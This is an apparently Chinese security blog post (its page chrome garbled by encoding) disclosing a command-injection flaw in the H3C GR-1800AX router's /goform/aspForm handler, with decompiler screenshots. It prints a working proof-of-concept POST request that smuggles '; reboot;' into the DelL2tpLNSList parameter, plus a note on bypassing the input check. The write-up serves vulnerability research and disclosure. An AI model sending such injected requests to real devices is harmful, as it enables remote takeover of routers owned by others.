=== Content from tjr181.com_78967573_20250115_180053.html ===
![avatar](http://file.tjr181.com/pictures/100.png)[æç« 7](/archives/)[æ ç­¾6](/tags/)[åç±»3](/categories/)

---

 [é¦é¡µ](/) [æ¶é´è½´](/archives/) [æ ç­¾](/tags/) [åç±»](/categories/) [åé¾](/link/) [å³äº](/about/)[![Logo](http://file.tjr181.com/pictures/100.png)ç§æå¥æ¢¦çå°çª](/ "ç§æå¥æ¢¦çå°çª") æç´¢ [é¦é¡µ](/) [æ¶é´è½´](/archives/) [æ ç­¾](/tags/) [åç±»](/categories/) [åé¾](/link/) [å³äº](/about/)
# H3C GR-1800AX

åè¡¨äº2024-11-08|æ´æ°äº2024-11-14|[cve](/categories/cve/)|å­æ°æ»è®¡:271|éè¯»æ¶é¿:1åé|éè¯»é:
## Vulnerability introduction

H3C GR-1800AX was discovered a fatal vulnerabilities that can cause a remote code execution(RCE) via the aspForm parame

Official website : <https://www.h3c.com/>

Download link: <https://www.h3c.com/cn/d_202304/1824907_30005_0.htm>

H3C MiniGRW1B0V100R007 is the latest version on GR-1800AX

![](https://cdn.nlark.com/yuque/0/2024/png/26824994/1730998518052-e0bb64f6-48bd-46bf-9344-5022e328b2cf.png)

## Vulnerability analysis

##### DelL2tpLNSList parameter in the function sub\_100780E8

In the binary file /bin/www , we use IDA to locate the function sub\_100780E8 that causes the vulnerability.

![](https://cdn.nlark.com/yuque/0/2024/png/26824994/1730998870069-d0e841bf-04fd-41cc-8366-ab0feff34772.png)

As you can see, the snprintf function is called on line 35 of the sub\_100780E8 function. Letâs trace the source of the parameter

![](https://cdn.nlark.com/yuque/0/2024/png/26824994/1730998978740-849ef709-fd66-4eab-80c2-67feae447cd4.png)

We found that the value of v6 and v7 is determined by parameter , we can bypass the check\_function sub\_1007844C by using the character â0aâ like this

![](https://cdn.nlark.com/yuque/0/2024/png/26824994/1731020540468-21a50676-c2e4-436a-9004-2565a43b0550.png)

![](https://cdn.nlark.com/yuque/0/2024/png/26824994/1731020426036-b23242a0-17a2-416c-bba6-b25bf091f2e8.png)

The image shows the router rebooting after the reboot command is executed

The POC is as follows:

| ``` 1234567891011121314151617 ``` | ``` POST /goform/aspForm HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 36Origin: http://221.211.212.130:8989Connection: closeReferer: http://221.211.212.130:8989/vpn_l2tp_lns_user.asp?refresh=yesCookie: JSESSIONID=0019e6e3Upgrade-Insecure-Requests: 1Priority: u=4CMD=DelL2tpLNSList&param=1; reboot; ``` |
| --- | --- |

Note that when copying this POC, there will be an additional 0d byte after âparam=1;â, and all you need to do is delete this byte

![](https://cdn.nlark.com/yuque/0/2024/png/26824994/1731562381221-0295d1bb-42fc-4682-9989-16f1708f7cde.png)

![](https://cdn.nlark.com/yuque/0/2024/png/26824994/1731562496100-5edaa5f1-f896-4cb6-926d-15e2a25cea52.png)

æç« ä½è: [ç§æå¥æ¢¦çå°çª](http://tjr181.com)æç« é¾æ¥: <http://tjr181.com/2024/11/08/H3C%20GR-1800AX/>çæå£°æ: æ¬åå®¢æææç« é¤ç¹å«å£°æå¤ï¼åéç¨ [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) è®¸å¯åè®®ãè½¬è½½è¯·æ³¨ææ¥èª [ç§æå¥æ¢¦çå°çª](http://tjr181.com)ï¼[cve](/tags/cve/)[iot](/tags/iot/)[ä¸ä¸ç¯H3C GR3200](/2024/11/14/H3C%20GR3200/ "H3C GR3200")[ä¸ä¸ç¯ctfshowè¥¿çæ¯wp](/2024/07/24/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/ "ctfshowè¥¿çæ¯wp")ç¸å³æ¨è [2024-07-24Tenda\_AX1803](/2024/07/24/Tenda-AX1803-1/ "Tenda_AX1803") [2024-11-14H3C GR-1200W](/2024/11/14/H3C%20GR-1200W/ "H3C GR-1200W") [2024-11-14H3C GR2200](/2024/11/14/H3C%20GR2200/ "H3C GR2200") [2024-11-14H3C GR3200](/2024/11/14/H3C%20GR3200/ "H3C GR3200")

---

 è¯è®ºValineDisqus![avatar](http://file.tjr181.com/pictures/100.png)ç§æå¥æ¢¦çå°çªååè±å·²å¼[æç« 7](/archives/)[æ ç­¾6](/tags/)[åç±»3](/categories/)[Subscribe Me](https://space.bilibili.com/353134309)å¬åæ¬¢è¿æ¥å°ç§æå¥æ¢¦çå°çªQwQç®å½

1. [1. Vulnerability introduction](#Vulnerability-introduction)
2. [2. Vulnerability analysis](#Vulnerability-analysis)
   1. [2.0.0.1. DelL2tpLNSList parameter in the function sub\_100780E8](#DelL2tpLNSList-parameter-in-the-function-sub-100780E8)
ææ°æç« [H3C GR-1200W](/2024/11/14/H3C%20GR-1200W/ "H3C GR-1200W")2024-11-14[H3C GR2200](/2024/11/14/H3C%20GR2200/ "H3C GR2200")2024-11-14[H3C GR3200](/2024/11/14/H3C%20GR3200/ "H3C GR3200")2024-11-14[H3C GR-1800AX](/2024/11/08/H3C%20GR-1800AX/ "H3C GR-1800AX")2024-11-08[ctfshowè¥¿çæ¯wp](/2024/07/24/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/ "ctfshowè¥¿çæ¯wp")2024-07-24æéé¢æ¥æ±ååæ¢¦çé¨ é¿æ²³æµå¥æé

ççæ¼«æ¼« æ¸¡è¿ç¾å·åä¸é

æå¬çç¬ç¬æ² äººé´æ¸æ¬¢å¯æ

è½è½å°å· æµè½¬çåå¹´å¤å¿

é£å¹è¿ å¸¦èµ°å²æè¹è·

è±è´¥è½ å´æè¿é

èå½±çè½®å» æ æ³è®¸ä¸æ¿è¯º

åç¾å¹´ç­ä½ åçä¸é
[åæ¢¦æ±å](https://music.163.com/#/song?id=1457113272)ç¯å¡

* [CSDN](https://www.csdn.net/)[å¾ç±ç ´è§£](https://www.52pojie.cn/)
* [github](https://github.com/)[google](https://www.google.com)
* [buuctf](https://buuoj.cn/)[nssctf](https://www.nssctf.cn/)
* [çéª](https://www.kanxue.com/)[fofa](https://fofa.info/)
* [iæ¥ç§](https://www.ichunqiu.com/)[360å¤¸å](https://quake.360.net/)
* [Hunter](https://hunter.qianxin.com/)[å¾®æ­¥](https://x.threatbook.com/)
æ¨èåé¾[![](http://file.tjr181.com/pictures/qg.png)](https://www.cnblogs.com/cyyyyi)[![](http://file.tjr181.com/pictures/zn.png)](https://www.cnblogs.com/bzbzzbc)[![](http://file.tjr181.com/pictures/lx.png)](https://badboy.plus/)[![](http://file.tjr181.com/pictures/dz.png)](https://www.dz233blogs.cn/)[![](http://file.tjr181.com/pictures/jl.png)](https://www.cnblogs.com/v3n0m-cccccc)[![](http://file.tjr181.com/pictures/100.png)](http://tjr181.com)[![](http://file.tjr181.com/pictures/100.png)å¹¿åä½æç§](http://tjr181.com)[![](http://file.tjr181.com/pictures/100.png)å¹¿åä½æç§](http://tjr181.com)©2021 - 2024  ç§æå¥æ¢¦çå°çªæ¡æ¶ [Hexo](https://hexo.io)|ä¸»é¢ [Butterfly](https://github.com/jerryc127/hexo-theme-butterfly)[![](http://file.tjr181.com/pictures/icp.png)æICPå¤2021019140å·](https://beian.miit.gov.cn/) æç´¢ æ°æ®åºå è½½ä¸­

---


